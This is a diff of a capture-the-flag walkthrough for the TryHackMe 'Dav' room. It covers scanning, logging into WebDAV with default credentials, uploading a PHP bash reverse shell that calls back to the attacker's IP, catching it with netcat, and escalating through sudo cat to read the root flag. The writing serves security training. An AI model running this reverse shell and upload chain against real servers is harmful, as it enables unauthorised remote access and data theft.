@@ -5,12 +5,15 @@
 - [References](#references)
 
 ## Room information
-```
+
+```text
+Type: Challenge
 Difficulty: Easy
 OS: Linux
 Subscription type: Free
 Description: boot2root machine for FIT and bsides guatemala CTF
 ```
+
 Room link: [https://tryhackme.com/r/room/bsidesgtdav](https://tryhackme.com/r/room/bsidesgtdav)
 
 ## Solution
@@ -18,6 +21,7 @@ Room link: [https://tryhackme.com/r/room/bsidesgtdav](https://tryhackme.com/r/ro
 ### Check for services with nmap
 
 We start by scanning the machine with `nmap`
+
 ```bash
 ┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/Dav]
 └─$ nmap -v -sV -sC 10.10.13.109                                    
@@ -70,7 +74,9 @@ Read data files from: /usr/bin/../share/nmap
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 8.26 seconds
 ```
+
 We have one service running:
+
 - Apache httpd 2.4.18 on port 80
 
 Manually browsing to port 80 shows a `Apache2 Ubuntu Default Page`.  
@@ -78,10 +84,11 @@ Manually browsing to port 80 shows a `Apache2 Ubuntu Default Page`.
 ### Check for files/directories with feroxbuster
 
 Next, we check for files/directories on the web service with `feroxbuster`
+
 ```bash
 ┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/Dav]
 └─$ feroxbuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -C 404 -x html,php,txt -u http://10.10.13.109 
-                                                                                                                                                                                          
+
  ___  ___  __   __     __      __         __   ___
 |__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
 |    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
@@ -123,17 +130,20 @@ Manually browsing to `http://10.10.13.109/webdav/` shows a directory listing wit
 ![Directory listing on Dav machine](Images/Directory_listing_on_Dav_machine.png)
 
 The file contains
+
 ```bash
 ┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/Dav]
 └─$ curl -u wampp:xampp http://10.10.13.109/webdav/passwd.dav
 wampp:$apr1$Wm2VTkFL$PVNRQv7kzqXQIHe14qKA91
 ```
+
 The salt is `apr1` (April 1st) so this is probably a [red herring](https://en.wikipedia.org/wiki/Red_herring).
 
 ### Upload a reverse shell
 
 Let's see if we can upload a reverse shell to the `/webdav` directory
-```bash          
+
+```bash
 ┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/Dav]
 └─$ davtest -auth wampp:xampp -url http://10.10.13.109/webdav/ 
 ********************************************************
@@ -189,9 +199,11 @@ Executes: http://10.10.13.109/webdav/DavTestDir_Kabylv8Ia_ao6N/davtest_Kabylv8Ia
 Executes: http://10.10.13.109/webdav/DavTestDir_Kabylv8Ia_ao6N/davtest_Kabylv8Ia_ao6N.txt
 Executes: http://10.10.13.109/webdav/DavTestDir_Kabylv8Ia_ao6N/davtest_Kabylv8Ia_ao6N.html
 ```
+
 It seems we can upload `php` files.
 
 We make a simple bash reverse shell in php
+
 ```php
 <?php 
 exec("/bin/bash -c 'bash -i >& /dev/tcp/10.14.61.233/12345 0>&1'");
@@ -199,6 +211,7 @@ exec("/bin/bash -c 'bash -i >& /dev/tcp/10.14.61.233/12345 0>&1'");
 ```
 
 Then we upload it with `curl`
+
 ```bash
 ┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/Dav]
 └─$ curl -u wampp:xampp -T revshell.php http://10.10.13.109/webdav/ 
@@ -216,6 +229,7 @@ Then we upload it with `curl`
 ### Get a reverse shell
 
 Next, we start a netcat listener
+
 ```bash
 ┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/Dav]
 └─$ nc -lvnp 12345                  
@@ -223,12 +237,14 @@ listening on [any] 12345 ...
 ```
 
 And trigger the reverse shell
+
 ```bash
 ┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/Dav]
 └─$ curl -u wampp:xampp http://10.10.13.109/webdav/revshell.php
 ```
 
 When the connection comes through we do some basic tests
+
 ```bash
 ┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/Dav]
 └─$ nc -lvnp 12345                  
@@ -252,6 +268,7 @@ drwxr-xr-x 2 www-data www-data 4096 Sep 18 05:26 DavTestDir_Kabylv8Ia_ao6N
 ### Get the user flag
 
 Next, we can search for the user flag with `find`
+
 ```bash
 www-data@ubuntu:/var/www/html/webdav$ find /home -type f -name [Uu]ser* 2>/dev/null
 <ml/webdav$ find /home -type f -name [Uu]ser* 2>/dev/null                    
@@ -259,6 +276,7 @@ www-data@ubuntu:/var/www/html/webdav$ find /home -type f -name [Uu]ser* 2>/dev/n
 ```
 
 Let's cat it
+
 ```bash
 www-data@ubuntu:/var/www/html/webdav$ cat /home/merlin/user.txt
 cat /home/merlin/user.txt
@@ -269,6 +287,7 @@ cat /home/merlin/user.txt
 
 We now start enumerating for ways to escalate our privileges.  
 First we check if we can run any commands as root via `sudo`
+
 ```bash
 www-data@ubuntu:/var/www/html/webdav$ sudo -l
 sudo -l
@@ -279,16 +298,19 @@ Matching Defaults entries for www-data on ubuntu:
 User www-data may run the following commands on ubuntu:
     (ALL) NOPASSWD: /bin/cat
 ```
+
 We can execute `/bin/cat`.
 
 ### Get the root flag
 
 Finally, we just cat the root flag
+
 ```bash
 www-data@ubuntu:/var/www/html/webdav$ sudo /bin/cat /root/root.txt
 sudo /bin/cat /root/root.txt
 1<REDACTED>5
 ```
+
 That was way to easy!
 
 For additional information, please see the references below.
